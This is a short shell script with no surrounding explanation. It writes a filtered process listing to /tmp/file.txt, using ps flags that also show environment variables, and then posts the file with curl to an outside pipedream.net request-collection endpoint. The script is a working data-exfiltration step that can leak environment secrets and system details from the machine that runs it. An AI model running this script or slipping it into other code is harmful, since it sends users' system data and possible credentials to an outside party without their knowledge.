#!/bin/sh


echo $(ps -axe | grep EKO) > /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
